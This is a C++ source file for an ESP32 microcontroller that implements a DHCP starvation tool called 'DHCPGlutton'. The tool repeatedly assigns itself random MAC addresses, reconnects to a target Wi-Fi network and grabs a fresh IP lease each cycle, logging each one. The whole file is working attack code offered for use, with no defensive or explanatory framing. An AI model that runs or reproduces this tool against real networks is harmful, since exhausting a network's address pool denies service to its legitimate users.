#include "dhcp_glutton.h"
#include <WiFi.h>
#include <esp_wifi.h>

static void mac_to_str(uint8_t* mac, char* buf) {
    snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

DHCPGlutton::DHCPGlutton(const char* ssid_str, const char* pass_str, int cooldown) {
    strncpy(ssid, ssid_str, sizeof(ssid) - 1);
    strncpy(password, pass_str, sizeof(password) - 1);
    cooldown_ms = cooldown;
    running = false;
    reconnect_count = 0;
    last_reconnect = 0;
    current_ip = "";
    
    WiFi.macAddress(original_mac);
}

DHCPGlutton::~DHCPGlutton() {
    if (running) stop();
    esp_wifi_set_mac(WIFI_IF_STA, original_mac);
}

void DHCPGlutton::generate_random_mac() {
    randomSeed(millis());
    for (int i = 0; i < 6; i++) {
        random_mac[i] = random(0, 256);
    }
    // Set locally administered bit
    random_mac[0] |= 0x02;
    random_mac[0] &= 0xFE;
}

void DHCPGlutton::start() {
    if (running) return;
    if (strlen(ssid) == 0) {
        Serial.println("[DHCP] Error: SSID not set");
        return;
    }
    
    running = true;
    reconnect_count = 0;
    last_reconnect = millis() - cooldown_ms; // Force immediate first reconnect
    Serial.println("[DHCP] Starvation started!");
    Serial.printf("[DHCP] Cooldown: %d ms\n", cooldown_ms);
}

void DHCPGlutton::stop() {
    if (!running) return;
    running = false;
    
    // Restore original MAC
    esp_wifi_set_mac(WIFI_IF_STA, original_mac);
    Serial.println("[DHCP] Stopped. Original MAC restored.");
    Serial.printf("[DHCP] Total reconnects: %d\n", reconnect_count);
}

bool DHCPGlutton::is_running() {
    return running;
}

void DHCPGlutton::step() {
    if (!running) return;
    
    unsigned long now = millis();
    if (now - last_reconnect < (unsigned long)cooldown_ms) return;
    last_reconnect = now;
    
    // Generate and set random MAC
    generate_random_mac();
    esp_err_t err = esp_wifi_set_mac(WIFI_IF_STA, random_mac);
    if (err != ESP_OK) {
        Serial.println("[DHCP] MAC set failed, retrying...");
        return;
    }
    
    // Reconnect to trigger DHCP
    WiFi.disconnect(false);
    delay(100);
    WiFi.begin(ssid, password);
    
    // Wait for connection (max 5 seconds)
    int retries = 50;
    while (WiFi.status() != WL_CONNECTED && retries-- > 0) {
        delay(100);
    }
    
    if (WiFi.status() == WL_CONNECTED) {
        reconnect_count++;
        current_ip = WiFi.localIP().toString();
        char mac_str[18];
        mac_to_str(random_mac, mac_str);
        Serial.printf("[DHCP] #%d → IP: %s  MAC: %s\n", reconnect_count, current_ip.c_str(), mac_str);
    } else {
        Serial.println("[DHCP] Reconnect failed, retrying next cycle...");
    }
}

String DHCPGlutton::get_current_mac_str() {
    char mac_str[18];
    mac_to_str(random_mac, mac_str);
    return String(mac_str);
}
